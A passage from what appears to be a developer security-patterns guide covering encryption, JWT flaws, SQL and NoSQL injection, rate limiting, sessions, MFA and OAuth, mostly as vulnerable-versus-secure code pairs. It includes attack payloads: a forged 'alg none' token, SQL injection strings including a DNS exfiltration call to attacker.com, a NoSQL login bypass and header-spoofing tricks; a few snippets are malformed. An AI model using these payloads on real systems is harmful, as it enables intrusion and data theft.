const cipher = crypto.createCipheriv(ALGORITHM, KEY, iv);

let encrypted = cipher.update(plaintext, 'utf8', 'hex');
encrypted += cipher.final('hex');

const authTag = cipher.getAuthTag();

return `${iv.toString('hex')}:${authTag.toString('hex')}:${encrypted}`;
}

export function decrypt(ciphertext: string): string {
const [ivHex, authTagHex, encrypted] = ciphertext.split(':');

const iv = Buffer.from(ivHex, 'hex');
const authTag = Buffer.from(authTagHex, 'hex');

const decipher = crypto.createDecipheriv(ALGORITHM, KEY, iv);
  decipher.setAuthTag(authTag);

let decrypted = decipher.update(encrypted, 'hex', 'utf8');
decrypted += decipher.final('utf8');

return decrypted;
}

// Password hashing - NEVER store plain passwords
import bcrypt from 'bcryptjs';

export async function hashPassword(password: string): Promise<string> {
return bcrypt.hash(password, 12); // 12 rounds
}

export async function verifyPassword(password: string, hash: string): Promise<boolean> {
return bcrypt.compare(password, hash);
}

```text

---

## API KEY MANAGEMENT

## Secure API Key Generation

**Why it exists:** Secure programmatic access

```typescript
// lib/apiKeys.ts
import crypto from 'crypto';
import { prisma } from './prisma';

export async function generateApiKey(userId: string, name: string) {
// Generate key: prefix + random bytes
const prefix = 'sk_live_';
const key = prefix + crypto.randomBytes(32).toString('base64url');

// Store only the hash
const hash = crypto.createHash('sha256').update(key).digest('hex');

await prisma.apiKey.create({
data: {
      userId,
      name,
      hash,
prefix: key.slice(0, 12),
lastUsed: null,
    },
  });

// Return key only once - user must store it
return { key, prefix: key.slice(0, 12) };
}

export async function validateApiKey(key: string) {
const hash = crypto.createHash('sha256').update(key).digest('hex');

const apiKey = await prisma.apiKey.findFirst({
where: { hash, revokedAt: null },
include: { user: true },
  });

if (apiKey) {
await prisma.apiKey.update({
where: { id: apiKey.id },
data: { lastUsed: new Date() },
    });
  }

return apiKey;
}

```text

---

## SECURITY HEADERS

## Helmet Configuration

**Why it exists:** HTTP security headers

```typescript
import helmet from 'helmet';

app.use(helmet({
contentSecurityPolicy: {
directives: {
defaultSrc: ["'self'"],
scriptSrc: ["'self'", "'unsafe-inline'", "cdn.example.com"],
styleSrc: ["'self'", "'unsafe-inline'", "fonts.googleapis.com"],
imgSrc: ["'self'", "data:", "*.cloudfront.net"],
connectSrc: ["'self'", "api.example.com"],
fontSrc: ["'self'", "fonts.gstatic.com"],
frameSrc: ["'none'"],
objectSrc: ["'none'"],
    },
  },
hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },
referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
}));

```text

---

### CONTINUED: MORE SECURITY PATTERNS

---

## DEFENSE

## JWT VULNERABILITIES DEEP DIVE

## Production JWT Attack Patterns

**Source:** Auth0 Security Research, PortSwigger Web Security
**Why this is critical:** JWT misconfigurations are among top 10 API vulnerabilities

```typescript
/**
- JWT VULNERABILITY #1: Algorithm Confusion Attack
- * THE BUG: Server accepts tokens signed with different algorithms
- than expected. Attacker can use "none" algorithm or switch from
- RS256 (asymmetric) to HS256 (symmetric) using public key as secret.
- * REAL INCIDENT: 2015 - Multiple libraries vulnerable
- CVE-2015-9235, CVE-2016-10555
 */

// VULNERABLE: Library switches algorithm based on token header
const jwt = require('jsonwebtoken');

// Attacker creates token with header: {"alg":"none","typ":"JWT"}
// Body: {"sub":"admin","role":"admin"}
// Signature: (empty)
// Some libraries will accept this!

// SECURE: Always specify expected algorithm
function verifyToken(token: string): JWTPayload {
return jwt.verify(token, SECRET_KEY, {
algorithms: ['HS256'], // EXPLICIT algorithm whitelist
issuer: 'your-app',
audience: 'your-api',
  });
}

/**
- JWT VULNERABILITY #2: Key Injection in JWK Header
- * THE BUG: JWT header contains embedded JWK (JSON Web Key).
- Server uses attacker-supplied key to verify signature.
- Attacker controls key = attacker can forge any token.
 */

// VULNERABLE: Trust key from token header
const header = JSON.parse(base64Decode(token.split('.')[0]));
const key = header.jwk; // ATTACKER CONTROLLED!
jwt.verify(token, key);

// SECURE: Only use server-side key storage
const TRUSTED_KEYS = await loadKeysFromKMS();

function verifyWithTrustedKeys(token: string): JWTPayload {
const decoded = jwt.decode(token, { complete: true });
const kid = decoded.header.kid;

const key = TRUSTED_KEYS.get(kid);
if (!key) throw new Error('Unknown key ID');

return jwt.verify(token, key, { algorithms: ['RS256'] });
}

/**
- JWT VULNERABILITY #3: Weak Secret Brute Force
- * THE BUG: HS256 with weak secret can be cracked offline.
- Once cracked, attacker can forge any token forever.
- * HASHCAT BENCHMARK: 15 billion HS256 attempts/second on GPU
 */

// WEAK: Short/predictable secrets
const weakSecrets = [
  'secret',
  'password123',
  process.env.APP_NAME,
  '1234567890',
];

// SECURE: Minimum 256-bit entropy
import { randomBytes } from 'crypto';

function generateSecureSecret(): string {
return randomBytes(32).toString('base64'); // 256 bits
}

// Even better: Use asymmetric (RS256, ES256)
// - No shared secret to leak
// - Can rotate public keys without downtime
// - Supports key revocation via JWKS

/**
- JWT SECURITY AUDIT CHECKLIST
- * 1. [ ] Algorithm specified explicitly (not from token header)
- 2. [ ] Key material from trusted source (not token)
- 3. [ ] Secret has sufficient entropy (256+ bits for HS256)
- 4. [ ] Token expiration enforced (exp claim)
- 5. [ ] Issuer validated (iss claim)
- 6. [ ] Audience validated (aud claim)
- 7. [ ] Token revocation mechanism exists
- 8. [ ] Refresh token rotation implemented
 */

```text

---

## SQL INJECTION BEYOND BASICS

## Second-Order & Blind SQL Injection

**Source:** OWASP Testing Guide, Real penetration test findings
**Why this is hard:** Automated scanners miss these

```typescript
/**
- SECOND-ORDER SQL INJECTION
- * THE BUG: Input is safely stored, but later queries use it unsafely.
- Scanner only tests immediate responses, misses delayed execution.
- * EXAMPLE SCENARIO:
- 1. User registers with username: admin'--
- 2. Registration uses parameterized query (safe)
- 3. Password reset uses: `SELECT * FROM users WHERE username = '${username}'`
- 4. Attacker triggers password reset for their account
- 5. Query becomes: SELECT * FROM users WHERE username = 'admin'--'
- 6. Attacker gets password reset for admin account
 */

// VULNERABLE: Trusting database values
async function sendPasswordReset(userId: string) {
const user = await db.query('SELECT username FROM users WHERE id = ?', [userId]);

// Username came from DB, but was user-supplied at registration!
const resetToken = await db.query(
`INSERT INTO reset_tokens (token, username)
VALUES (?, '${user.username}')  -- VULNERABLE!
RETURNING token`
  );
}

// SECURE: Parameterize EVERYWHERE, even "trusted" data
async function sendPasswordResetSecure(userId: string) {
const user = await db.query('SELECT username FROM users WHERE id = ?', [userId]);

const resetToken = await db.query(
'INSERT INTO reset_tokens (token, username) VALUES (?, ?) RETURNING token',
[generateToken(), user.username]  // Parameterized!
  );
}

/**
- BLIND SQL INJECTION TECHNIQUES
- * When error messages are hidden, attackers use:
- 1. Boolean-based: Different response for true/false conditions
- 2. Time-based: SLEEP() or heavy query for true condition
- 3. Out-of-band: DNS/HTTP exfiltration
 */

// Time-based blind SQLi detection
// Attacker payload: admin' AND SLEEP(5)--
// If response takes 5 seconds, injection confirmed

// DEFENSE: SQL query timeout + parameterization
const pool = new Pool({
statement_timeout: 5000, // 5 second max
});

// Out-of-band detection (advanced)
// Payload: admin'; SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\x'))--
// Attacker's DNS receives: 5.7.32.attacker.com

/**
- NOSQL INJECTION
- * MongoDB and other NoSQL DBs have their own injection patterns
 */

// VULNERABLE: Object injection
app.post('/login', (req, res) => {
const user = await db.collection('users').findOne({
username: req.body.username,  // What if this is { "$gt": "" }?
password: req.body.password,
  });
});

// Attacker sends: { "username": {"$gt": ""}, "password": {"$gt": ""} }
// Query becomes: find where username > "" AND password > ""
// Returns first user in database!

// SECURE: Type validation + sanitization
import { z } from 'zod';

const loginSchema = z.object({
username: z.string().max(50),
password: z.string().max(100),
});

app.post('/login', async (req, res) => {
const { username, password } = loginSchema.parse(req.body);
// Now guaranteed to be strings, not objects
});

```text

---

## RATE LIMITING BYPASS TECHNIQUES

## Production Rate Limit Evasion

**Source:** Bug bounty reports, Security research
**Why standard rate limiting fails:** Attackers know the bypass tricks

```typescript
/**
- RATE LIMITING BYPASS TECHNIQUES (FOR DEFENDERS TO KNOW)
- * 1. IP ROTATION
- - Cloud IPs, residential proxies, Tor exit nodes
- - Defense: Rate limit by account, not just IP
- * 2. HEADER MANIPULATION
- - X-Forwarded-For: 127.0.0.1
- - X-Real-IP: 10.0.0.1
- - Defense: Only trust headers from known proxies
- * 3. PARAMETER POLLUTION
- - /login?user=admin vs /login?user=admin&extra=1
- - Defense: Normalize requests before rate limiting
- * 4. CASE MANIPULATION
- - /Login vs /LOGIN vs /login
- - Defense: Lowercase all paths
- * 5. ENCODING TRICKS
- - /login vs /l%6fgin (URL encoded 'o')
- - Defense: Decode before rate limiting
 */

class RobustRateLimiter {
async checkLimit(req: Request): Promise<{ allowed: boolean; retryAfter?: number }> {
// 1. Get TRUE client IP (not spoofed headers)
const ip = this.getTrueClientIP(req);

// 2. Normalize request path
const path = this.normalizePath(req.path);

// 3. Get user ID if authenticated
const userId = req.user?.id;

// 4. Check multiple dimensions
const checks = await Promise.all([
      this.checkIPLimit(ip),
userId && this.checkUserLimit(userId),
      this.checkGlobalLimit(),
    ]);

const blocked = checks.find(c => c && !c.allowed);
if (blocked) {
return { allowed: false, retryAfter: blocked.retryAfter };
    }

return { allowed: true };
  }

private getTrueClientIP(req: Request): string {
// Only trust X-Forwarded-For from known load balancers
const forwardedFor = req.headers['x-forwarded-for'];

if (forwardedFor && this.isFromTrustedProxy(req.ip)) {
// Take rightmost IP (added by our proxy)
const ips = forwardedFor.split(',').map(ip => ip.trim());
return ips[ips.length - 1];
    }

return req.ip;
  }

private normalizePath(path: string): string {
return decodeURIComponent(path)
      .toLowerCase()
.replace(/\/+/g, '/')  // Collapse multiple slashes
.replace(/\/$/, '');   // Remove trailing slash
  }

private isFromTrustedProxy(ip: string): boolean {
const trustedCIDRs = [
'10.0.0.0/8', // Internal network
'172.16.0.0/12', // Internal network
'192.168.0.0/16', // Internal network
    ];

return trustedCIDRs.some(cidr => this.ipInCIDR(ip, cidr));
  }
}

/**
- DISTRIBUTED RATE LIMITING
- * Single-server rate limiting doesn't scale.
- Must use centralized store (Redis) for consistency.
- * SLIDING WINDOW ALGORITHM (more accurate than fixed window)
 */

class SlidingWindowRateLimiter {
constructor(private redis: Redis) {}

async isAllowed(
key: string,
limit: number,
windowMs: number
): Promise<boolean> {
const now = Date.now();
const windowStart = now - windowMs;

const multi = this.redis.multi();

// Remove old entries
multi.zremrangebyscore(key, 0, windowStart);

// Count current window
    multi.zcard(key);

// Add current request
multi.zadd(key, now.toString(), `${now}-${Math.random()}`);

// Set expiry
multi.expire(key, Math.ceil(windowMs / 1000));

const results = await multi.exec();
const count = results[1][1] as number;

return count < limit;
  }
}

```text

---

### [SECURITY RESEARCHER LEVEL] CONTINUED: MORE PATTERNS

### Density: OWASP/Bug Bounty research quality

---

## ?? SECURITY - PENETRATION TESTING

> **The offensive security patterns**

---

## Pen Test Phases

```text
1. RECONNAISSANCE
- Gather public info
- DNS records, subdomains
- Tech stack identification

2. SCANNING
- Port scanning (nmap)
- Vulnerability scanning
- Service enumeration

3. EXPLOITATION
- Attempt identified vulnerabilities
- Gain access if possible

4. POST-EXPLOITATION
- Privilege escalation
- Lateral movement
- Data exfiltration (simulated)

5. REPORTING
- Document findings
- Risk assessment
- Remediation recommendations

```text

---

## Common Findings

| Finding | Risk | Remediation |
|---------|------|-------------|
| SQL Injection | Critical | Parameterized queries |
| XSS | High | Output encoding |
| Weak passwords | High | Password policy |
| Missing headers | Medium | Add security headers |
| Info disclosure | Low | Remove verbose errors |

---

## Bug Bounty Scope

```text
IN SCOPE:

- Main application

- API endpoints

- Authentication flows

OUT OF SCOPE:

- Third-party services

- Social engineering

- Physical attacks

- DoS testing (unless approved)

```text

---
## ?? INCIDENT RESPONSE PLAYBOOK

> **The security incident handling**

---

## Incident Classification

| Level | Description | Response |
|-------|-------------|----------|
| SEV1 | Active breach, data exposed | Immediate, all hands |
| SEV2 | Vulnerability exploited | Within 1 hour |
| SEV3 | Suspicious activity | Within 4 hours |
| SEV4 | Minor security issue | Next business day |

---

## Response Steps

```text
1. DETECT & IDENTIFY
- What is happening?
- When did it start?
- What systems affected?

2. CONTAIN
- Isolate affected systems
- Block malicious IPs
- Disable compromised accounts

3. ERADICATE
- Remove malware
- Patch vulnerabilities
- Reset credentials

4. RECOVER
- Restore from clean backups
- Verify integrity
- Monitor closely

5. POST-INCIDENT
- Document timeline
- Root cause analysis
- Lessons learned
- Update defenses

```text

---

## Evidence Preservation

```json
[ ] Capture system state
[ ] Preserve logs (immutable)
[ ] Memory dumps if needed
[ ] Network captures
[ ] Screenshots
[ ] Chain of custody

```text

---
## ?? SECRETS ROTATION

> **The credential lifecycle patterns**

---

## Rotation Strategy

```sql
1. GENERATE new secret
2. CONFIGURE both old and new secrets valid
3. UPDATE all consumers to use new
4. VERIFY all using new secret
5. INVALIDATE old secret
6. DELETE old secret from storage

```text

---

## AWS Secrets Manager

```javascript
const {
  SecretsManagerClient,
  GetSecretValueCommand
} = require("@aws-sdk/client-secrets-manager");

const client = new SecretsManagerClient();

async function getSecret(secretName) {
const response = await client.send(
new GetSecretValueCommand({ SecretId: secretName })
  );
return JSON.parse(response.SecretString);
}

// Enable auto-rotation in AWS Console
// Lambda function handles rotation

```text

---

## Database Password Rotation

```yaml
CHALLENGE: Zero-downtime rotation

STEPS:
1. Create new user with same permissions
2. Update app to use new credentials
3. Wait for connection pool refresh
4. Drop old user

OR use dual-password support:

- PostgreSQL: CREATE ROLE with multiple passwords (extensions)

- AWS RDS: Secrets Manager integration

```text

---
## ?? AUTHENTICATION PATTERNS

> **The auth implementation patterns**

---

## Stateless JWT Flow

```text
1. User logs in with credentials
2. Server validates, creates JWT
3. JWT contains: { userId, role, exp }
4. Client stores JWT (httpOnly cookie)
5. Client sends JWT with each request
6. Server validates JWT signature
7. No session storage needed!

```text

---

## Refresh Token Pattern

```javascript
// Access token: Short-lived (15 min)
const accessToken = jwt.sign(
{ userId, role },
  ACCESS_SECRET,
{ expiresIn: '15m' }
);

// Refresh token: Long-lived (7 days)
const refreshToken = jwt.sign(
{ userId, tokenVersion },
  REFRESH_SECRET,
{ expiresIn: '7d' }
);

// Store refresh token hash in DB
// Rotate on each use

```text

---

## Token Revocation

```javascript
// Option 1: Short expiry (accept gap)
// Tokens valid until expiry even after logout

// Option 2: Token blacklist
const blacklist = new Set(); // or Redis
blacklist.add(tokenId);

// Option 3: Token versioning
// user.tokenVersion = 1
// JWT contains version
// Increment version to invalidate all

```text

---
## ?? SECURITY LOGGING

> **The audit and security event patterns**

---

## What to Log

```yaml
AUTHENTICATION:

- Login success/failure

- Password reset requests

- MFA challenges

- Session creation/destruction

AUTHORIZATION:

- Access denied events

- Privilege escalation attempts

- Resource access patterns

DATA ACCESS:

- Sensitive data queries

- Bulk exports

- Admin actions

SYSTEM:

- Configuration changes

- API key creation/revocation

- User permission changes

```text

---

## Log Format

```javascript
const securityLog = {
timestamp: new Date().toISOString(),
eventType: 'authentication.login_failure',
severity: 'warning',
actor: {
ip: '192.168.1.1',
userAgent: 'Mozilla/5.0...',
userId: null // Unknown on failed login
  },
target: {
type: 'user',
identifier: 'user@example.com'
  },
outcome: 'failure',
reason: 'invalid_password',
metadata: {
attemptCount: 3,
lockoutTriggered: false
  }
};

```text

---

## Alerting Thresholds

```text
IMMEDIATE ALERT:

- 5 failed logins in 5 minutes (same user)

- Login from new country

- Admin privilege granted

- Bulk data export

DAILY REVIEW:

- All failed login attempts

- Permission changes

- API key usage

WEEKLY:

- Access pattern analysis

- Unused privileges

```text

---
## ?? INPUT VALIDATION PATTERNS

> **The data sanitization patterns**

---

## Zod Schema Validation

```typescript
import { z } from 'zod';

const UserSchema = z.object({
email: z.string().email(),
password: z.string().min(8).max(100),
age: z.number().int().positive().max(150).optional(),
role: z.enum(['user', 'admin']).default('user')
});

// Parse and validate
const user = UserSchema.parse(requestBody);
// Throws ZodError if invalid

```text

---

## Express Middleware

```typescript
const validate = (schema: z.ZodSchema) => {
return (req: Request, res: Response, next: NextFunction) => {
try {
req.body = schema.parse(req.body);
      next();
} catch (error) {
if (error instanceof z.ZodError) {
return res.status(400).json({
error: 'Validation failed',
details: error.errors
        });
      }
      next(error);
    }
  };
};

app.post('/users', validate(UserSchema), createUser);

```text

---

## Sanitization

```typescript
import DOMPurify from 'isomorphic-dompurify';

// HTML sanitization
const cleanHtml = DOMPurify.sanitize(userInput);

// SQL - use parameterized queries (Prisma does this)
// Never concatenate user input into SQL

// File paths - validate and sanitize
const safePath = path.basename(userInput);
// Removes directory traversal

```text

---
## ?? SECURE SESSION MANAGEMENT

> **The session security patterns**

---

## Session ID Generation

```javascript
// INSECURE: Predictable
const sessionId = `${userId}-${Date.now()}`;

// SECURE: Cryptographically random
const sessionId = crypto.randomBytes(32).toString('hex');

```text

---

## Cookie Settings

```javascript
res.cookie('session', sessionId, {
httpOnly: true,    // No JS access
secure: true,  // HTTPS only
sameSite: 'strict', // CSRF protection
maxAge: 24 * 60 * 60 * 1000, // 24 hours
path: '/',
domain: '.example.com'
});

```text

---

## Session Fixation Prevention

```javascript
// On login: Create NEW session, don't reuse
app.post('/login', async (req, res) => {
// Destroy any existing session
  req.session.destroy();

// Create fresh session after auth
req.session.regenerate(() => {
req.session.userId = user.id;
    res.redirect('/dashboard');
  });
});

```text

---

## Idle Timeout

```javascript
const SESSION_IDLE_TIMEOUT = 30 * 60 * 1000; // 30 min

app.use((req, res, next) => {
if (req.session.lastActivity) {
const idle = Date.now() - req.session.lastActivity;
if (idle > SESSION_IDLE_TIMEOUT) {
      req.session.destroy();
return res.redirect('/login');
    }
  }
req.session.lastActivity = Date.now();
  next();
});

```text

---
## ?? SECURITY HEADERS DEEP DIVE

> **The essential HTTP security headers**

---

## Strict-Transport-Security

```yaml
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

WHAT: Forces HTTPS for 1 year
WHY: Prevents SSL stripping attacks
PRELOAD: Submit to browser preload list

CAUTION: Test thoroughly before enabling
Cannot be undone easily!

```text

---

## Content-Security-Policy

```text
Content-Security-Policy:
default-src 'self';
script-src 'self' 'unsafe-inline' https://cdn.example.com;
style-src 'self' 'unsafe-inline';
img-src 'self' data: https:;
connect-src 'self' https://api.example.com;
frame-ancestors 'none';
base-uri 'self';
form-action 'self';

REPORT: Add report-uri to collect violations

```text

---

## X-Frame-Options

```yaml
X-Frame-Options: DENY

OPTIONS:

- DENY: Never allow framing

- SAMEORIGIN: Only same origin

- ALLOW-FROM uri: Specific origin (deprecated)

WHY: Prevents clickjacking attacks

```text

---

## Permissions-Policy

```text
Permissions-Policy:
  geolocation=(),
  microphone=(),
  camera=(),
  payment=(self)

WHAT: Controls browser features
WHY: Reduces attack surface

```text

---
## ?? PASSWORD SECURITY

> **The authentication security patterns**

---

## Hashing Algorithm Choice

```yaml
RECOMMENDED: Argon2id
- Memory-hard (resistant to GPU attacks)
- Modern, well-analyzed

ACCEPTABLE: bcrypt
- Proven, widely supported
- 10+ rounds minimum

AVOID:
- MD5, SHA1, SHA256 (too fast!)
- Plain bcrypt without salt
- Custom hashing schemes

```text

---

## Implementation

```javascript
import argon2 from 'argon2';

async function hashPassword(password) {
return await argon2.hash(password, {
type: argon2.argon2id,
memoryCost: 65536,  // 64 MB
timeCost: 3,  // iterations
parallelism: 4  // threads
  });
}

async function verifyPassword(password, hash) {
try {
return await argon2.verify(hash, password);
} catch {
return false;
  }
}

```text

---

## Password Policy

```javascript
const passwordPolicy = {
minLength: 12,  // Not 8!
maxLength: 128,  // Prevent DoS
requireUppercase: false, // Debatable
requireNumber: false,    // Debatable
requireSpecial: false,   // Debatable
checkBreached: true  // HaveIBeenPwned API
};

// Better: Check entropy or use zxcvbn library
import zxcvbn from 'zxcvbn';
const result = zxcvbn(password);
if (result.score < 3) {
throw new Error(result.feedback.warning);
}

```text

---
## ?? API AUTHENTICATION PATTERNS

> **The secure API access patterns**

---

## API Key vs JWT vs OAuth

| Method | Use Case | Security |
|--------|----------|----------|
| API Key | Server-to-server | Shared secret |
| JWT | User authentication | Signed tokens |
| OAuth | Third-party access | Delegated auth |

---

## API Key Best Practices

```javascript
// Generate secure key
const apiKey = crypto.randomBytes(32).toString('hex');

// Store hash, not key
const keyHash = crypto.createHash('sha256').update(apiKey).digest('hex');

// Validate
function validateApiKey(providedKey) {
const hash = crypto.createHash('sha256').update(providedKey).digest('hex');
return db.apiKeys.findOne({ hash });
}

```text

---

## JWT for APIs

```javascript
// Create token
const token = jwt.sign(
{ sub: userId, scope: ['read', 'write'] },
  process.env.JWT_SECRET,
{ expiresIn: '1h', issuer: 'api.example.com' }
);

// Validate
app.use((req, res, next) => {
const token = req.headers.authorization?.replace('Bearer ', '');
try {
req.user = jwt.verify(token, process.env.JWT_SECRET);
    next();
} catch {
res.status(401).json({ error: 'Invalid token' });
  }
});

```text

---

## Scope-Based Authorization

```javascript
function requireScope(...requiredScopes) {
return (req, res, next) => {
| const userScopes = req.user.scope |  | []; |
const hasScope = requiredScopes.every(s => userScopes.includes(s));

if (!hasScope) {
return res.status(403).json({ error: 'Insufficient permissions' });
    }
    next();
  };
}

app.delete('/users/:id', requireScope('users:delete'), deleteUser);

```text

---
## ?? RBAC IMPLEMENTATION

> **Role-Based Access Control patterns**

---

## Database Schema

```sql
CREATE TABLE roles (
id SERIAL PRIMARY KEY,
name VARCHAR UNIQUE NOT NULL
);

CREATE TABLE permissions (
id SERIAL PRIMARY KEY,
name VARCHAR UNIQUE NOT NULL,
resource VARCHAR NOT NULL,
action VARCHAR NOT NULL
);

CREATE TABLE role_permissions (
role_id INT REFERENCES roles(id),
permission_id INT REFERENCES permissions(id),
PRIMARY KEY (role_id, permission_id)
);

CREATE TABLE user_roles (
user_id INT REFERENCES users(id),
role_id INT REFERENCES roles(id),
PRIMARY KEY (user_id, role_id)
);

```text

---

## Permission Check

```typescript
async function hasPermission(
userId: string,
resource: string,
action: string
): Promise<boolean> {
const result = await db.$queryRaw`
SELECT 1 FROM user_roles ur
JOIN role_permissions rp ON ur.role_id = rp.role_id
JOIN permissions p ON rp.permission_id = p.id
WHERE ur.user_id = ${userId}
AND p.resource = ${resource}
AND p.action = ${action}
LIMIT 1
  `;
return result.length > 0;
}

```text

---

## Middleware

```typescript
function requirePermission(resource: string, action: string) {
return async (req: Request, res: Response, next: NextFunction) => {
const canAccess = await hasPermission(req.user.id, resource, action);

if (!canAccess) {
return res.status(403).json({ error: 'Permission denied' });
    }
    next();
  };
}

app.delete('/posts/:id',
requirePermission('posts', 'delete'),
  deletePost
);

```text

---
## ?? MFA IMPLEMENTATION

> **Multi-factor authentication patterns**

---

## TOTP (Time-based One-Time Password)

```javascript
import speakeasy from 'speakeasy';

// Setup: Generate secret
const secret = speakeasy.generateSecret({
name: 'MyApp',
issuer: 'MyApp'
});

// Return to user:
// secret.otpauth_url (for QR code)
// secret.base32 (for manual entry)

// Verification
function verifyTOTP(userToken, secret) {
return speakeasy.totp.verify({
secret: secret,
encoding: 'base32',
token: userToken,
window: 1 // Allow 30s clock drift
  });
}

```text

---

## Backup Codes

```javascript
function generateBackupCodes(count = 10) {
const codes = [];
for (let i = 0; i < count; i++) {
    codes.push(crypto.randomBytes(4).toString('hex'));
  }
return codes;
}

// Store hashed
const hashedCodes = codes.map(code =>
  crypto.createHash('sha256').update(code).digest('hex')
);

// Verify and consume
async function useBackupCode(userId, code) {
const hash = crypto.createHash('sha256').update(code).digest('hex');
const result = await db.backupCodes.deleteMany({
where: { userId, hash }
  });
return result.count > 0;
}

```text

---

## Recovery Flow

```text
1. User loses device
2. User clicks "Lost access"
3. User enters backup code
4. System verifies and consumes code
5. User sets up new MFA device
6. Generate new backup codes

```text

---
## ?? SECURITY SCANNING

> **The automated vulnerability detection**

---

## Static Analysis

```bash

## ESLint security plugin

npm install eslint-plugin-security --save-dev

## .eslintrc.js

module.exports = {
plugins: ['security'],
extends: ['plugin:security/recommended']
};

```text

---

## Dependency Scanning

```bash

## npm audit

npm audit

## Snyk

npx snyk test

## OWASP Dependency Check

dependency-check --project "MyApp" --scan ./

```text

---

## Container Scanning

```yaml

## GitHub Actions with Trivy

- name: Scan image
uses: aquasecurity/trivy-action@master
  with:
image-ref: myapp:${{ github.sha }}
format: 'table'
exit-code: '1'
severity: 'CRITICAL,HIGH'

```text

---

## SAST in CI

```yaml

## GitHub Actions

- name: SonarCloud Scan
uses: SonarSource/sonarcloud-github-action@master
  env:
SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}

## Block PR if quality gate fails

- name: Check Quality Gate
| run: |
if [ "${{ steps.sonarqube.outputs.quality-gate-status }}" != "PASSED" ]; then
exit 1
    fi

```text

---
## ?? ACCOUNT SECURITY PATTERNS

> **The user account protection patterns**

---

## Login Attempt Tracking

```javascript
async function handleLoginAttempt(email, password, ip) {
const key = `login_attempts:${email}`;
const attempts = await redis.incr(key);

if (attempts === 1) {
await redis.expire(key, 15 * 60); // 15 min window
  }

if (attempts > 5) {
await lockAccount(email);
throw new Error('Account locked. Please reset password.');
  }

const user = await authenticate(email, password);
if (user) {
await redis.del(key); // Reset on success
  }

return user;
}

```text

---

## Suspicious Activity Detection

```javascript
const SUSPICIOUS_SIGNALS = {
NEW_DEVICE: 'new_device',
NEW_COUNTRY: 'new_country',
UNUSUAL_TIME: 'unusual_time',
RAPID_REQUESTS: 'rapid_requests'
};

async function evaluateLoginRisk(user, context) {
const signals = [];

if (!await isKnownDevice(user.id, context.deviceId)) {
    signals.push(SUSPICIOUS_SIGNALS.NEW_DEVICE);
  }

if (!await isKnownCountry(user.id, context.country)) {
    signals.push(SUSPICIOUS_SIGNALS.NEW_COUNTRY);
  }

return {
riskLevel: signals.length > 1 ? 'high' : signals.length ? 'medium' : 'low',
    signals,
requiresMFA: signals.length > 0
  };
}

```text

---

## Session Security

```javascript
// Terminate all sessions except current
async function terminateOtherSessions(userId, currentSessionId) {
await redis.del(`sessions:${userId}`);
await redis.sadd(`sessions:${userId}`, currentSessionId);

// Notify user
await sendEmail(userId, 'All other sessions have been logged out');
}

```text

---
## ?? OAUTH 2.0 DEEP DIVE

> **The authorization patterns**

---

## PKCE Flow (for SPAs and Mobile)

```javascript
// 1. Generate code verifier (random string)
const codeVerifier = generateRandomString(128);

// 2. Create code challenge
const codeChallenge = base64UrlEncode(sha256(codeVerifier));

// 3. Redirect to authorize with challenge
const authUrl = `https://auth.example.com/authorize?
  response_type=code&
  client_id=${clientId}&
  redirect_uri=${redirectUri}&
  code_challenge=${codeChallenge}&
  code_challenge_method=S256&
scope=openid profile email`;

// 4. Exchange code for token (include verifier)
const tokenResponse = await fetch('https://auth.example.com/token', {
method: 'POST',
body: new URLSearchParams({
grant_type: 'authorization_code',
code: authorizationCode,
redirect_uri: redirectUri,
client_id: clientId,
code_verifier: codeVerifier  // Proves we started the flow
  })
});

// WHY PKCE?
// Prevents code interception attacks
// No client secret needed in browser

```text

---

## Token Storage

```text
WHERE TO STORE TOKENS:

ACCESS TOKEN:

- Memory only (best)

- Short-lived (15 min)

REFRESH TOKEN:

- HttpOnly cookie (best)

- NOT localStorage (XSS vulnerable)

GOTCHA: Never store access token in localStorage!
Any XSS can steal it.

```text

---

## Silent Refresh

```javascript
// Refresh token before expiry
async function silentRefresh() {
// Use hidden iframe for same-origin
// Or use refresh token cookie

const response = await fetch('/api/auth/refresh', {
method: 'POST',
credentials: 'include'  // Include cookies
  });

if (response.ok) {
const { accessToken } = await response.json();
    setAccessToken(accessToken);
    scheduleRefresh(accessToken);
} else {
// Refresh failed, user must re-login
    logout();
  }
}

// Schedule refresh before expiry
function scheduleRefresh(token) {
const exp = decodeToken(token).exp;
const refreshAt = (exp * 1000) - Date.now() - 60000; // 1 min before
setTimeout(silentRefresh, refreshAt);
}

```text

---
## JWT SECURITY PATTERNS

> **The patterns for secure token handling**

---

## Token Structure

```yaml
HEADER.PAYLOAD.SIGNATURE

Header: {"alg": "HS256", "typ": "JWT"}
Payload: {"sub": "user123", "exp": 1234567890}
Signature: HMACSHA256(header + "." + payload, secret)

```text

---

## Access + Refresh Tokens

```typescript
// Generate tokens
function generateTokens(userId: string) {
const accessToken = jwt.sign(
{ sub: userId },
    process.env.ACCESS_SECRET,
{ expiresIn: '15m' }  // Short-lived
  );

const refreshToken = jwt.sign(
{ sub: userId },
    process.env.REFRESH_SECRET,
{ expiresIn: '7d' }  // Long-lived
  );

return { accessToken, refreshToken };
}

// Refresh endpoint
app.post('/refresh', async (req, res) => {
const { refreshToken } = req.cookies;

try {
const payload = jwt.verify(refreshToken, process.env.REFRESH_SECRET);

// Check if token is revoked
const isRevoked = await redis.get(`revoked:${refreshToken}`);
if (isRevoked) throw new Error('Token revoked');

const tokens = generateTokens(payload.sub);

// Rotate refresh token
await redis.set(`revoked:${refreshToken}`, '1', 'EX', 7 * 24 * 60 * 60);

res.cookie('refreshToken', tokens.refreshToken, {
httpOnly: true,
secure: true,
sameSite: 'strict'
    });

res.json({ accessToken: tokens.accessToken });
} catch (err) {
res.status(401).json({ error: 'Invalid token' });
  }
});

```text

---

## Security Checklist

```text
Use strong secrets (256+ bits)
Short access token expiry (15 min)
Store refresh token in HttpOnly cookie
Implement token rotation
Keep revocation list in Redis
Validate token on every request
NEVER store JWT in localStorage
NEVER trust client-side token data

```text

---
## AUTHENTICATION FLOW PATTERNS

> **The auth patterns that don't break**

---

## OAuth 2.0 with PKCE (SPA/Mobile)

```typescript
// 1. Generate PKCE verifier and challenge
function generatePKCE() {
const verifier = crypto.randomBytes(32).toString('base64url');
const challenge = crypto
    .createHash('sha256')
    .update(verifier)
    .digest('base64url');
return { verifier, challenge };
}

// 2. Start OAuth flow
function startAuth() {
const { verifier, challenge } = generatePKCE();
